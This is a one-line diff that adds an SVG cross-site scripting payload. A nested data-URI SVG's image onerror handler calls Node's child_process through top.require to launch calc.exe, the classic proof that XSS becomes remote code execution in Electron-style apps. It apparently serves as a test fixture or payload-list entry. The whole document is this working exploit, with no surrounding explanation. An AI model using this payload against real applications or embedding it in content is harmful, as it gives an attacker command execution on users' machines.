@@ -1,0 +1,1 @@
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='asdf' onerror='top.require(`child_process`).execSync(`calc.exe`)' /&gt;&lt;/svg&gt;#x" />
